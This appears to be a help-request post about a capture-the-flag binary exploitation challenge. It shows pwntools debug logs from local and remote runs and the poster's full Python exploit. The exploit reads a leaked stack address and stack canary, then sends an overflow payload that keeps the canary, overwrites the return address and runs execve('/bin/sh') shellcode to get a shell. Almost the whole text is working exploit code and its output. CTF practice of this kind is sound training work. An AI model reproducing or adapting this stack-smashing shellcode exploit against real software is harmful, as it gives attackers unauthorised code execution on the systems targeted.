local binary output
```
[DEBUG] Sent 0x3 bytes:
    b'48\n'
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.12/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, rcx
    mov al, 0x3b
    syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-4sc8k7n0/step2 /tmp/pwn-asm-4sc8k7n0/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-4sc8k7n0/step3 /tmp/pwn-asm-4sc8k7n0/step4
/usr/local/lib/python3.12/dist-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x6d bytes:
    b"Wow, it seems your shellcode is going to be very powerful. I'm looking forward to seeing its full potential!\n"
[DEBUG] Sent 0x2e bytes:
    00000000  2f 62 69 6e  2f 73 68 00  00 61 b4 3a  7f 12 4f c6  │/bin│/sh·│·a·:│··O·│
    00000010  42 42 42 42  42 42 42 42  c0 d8 1f 08  ff 7f 00 00  │BBBB│BBBB│····│····│
    00000020  48 31 f6 48  31 d2 48 89  cf b0 3b 0f  05 0a        │H1·H│1·H·│··;·│··│
    0000002e
[*] Switching to interactive mode

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x41 bytes:
```

remote output: 
```
[DEBUG] Sent 0x3 bytes:
    b'48\n'
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.12/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, rcx
    mov al, 0x3b
    syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-bhbj9trn/step2 /tmp/pwn-asm-bhbj9trn/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-bhbj9trn/step3 /tmp/pwn-asm-bhbj9trn/step4
/usr/local/lib/python3.12/dist-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x6c bytes:
    b"Wow, it seems your shellcode is going to be very powerful. I'm looking forward to seeing its full potential!"
[DEBUG] Sent 0x2e bytes:
    00000000  2f 62 69 6e  2f 73 68 00  00 ab c8 e7  ce e3 a6 3c  │/bin│/sh·│····│···<│
    00000010  42 42 42 42  42 42 42 42  70 51 fa 9d  fe 7f 00 00  │BBBB│BBBB│pQ··│····│
    00000020  48 31 f6 48  31 d2 48 89  cf b0 3b 0f  05 0a        │H1·H│1·H·│··;·│··│
    0000002e
[*] Switching to interactive mode
[DEBUG] Received 0x1 bytes:
    b'\n'
```

my exploit
```py
from pwn import * 

#binary = "./program"
context.arch = 'amd64'
#p = process(binary)
p = remote("chal.firebird.sh", 35028)
context.log_level = 'debug'
#s = 'b* UwU_main+546'
#gdb.attach(p, s)
p.recvuntil("0x")
leak_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)

p.recvuntil("0x")
canary = int(b'0x' + p.recvuntil(b' ', drop = True), 16)

#print(hex(canary))
p.sendlineafter("how long is your shellcode?", b'48')

shellcode_addr = leak_addr + 0x18 + 8 + 8





shellcode1 = asm("""
xor rsi, rsi            
xor rdx, rdx            
mov rdi, rcx            
mov al, 0x3b            
syscall                
""")   



shellcode_addr = leak_addr + 0x18 + 8 + 8 # leak_addr is rbp-0x18
payload = b'/bin/sh\x00' # 8 bytes from rbp_0x10 to canary
payload += p64(canary) # perserving canary
payload += b'BBBBBBBB'
payload += p64(shellcode_addr)
payload += shellcode1

p.sendlineafter("I'm looking forward to seeing its full potential!", payload)
p.interactive()
```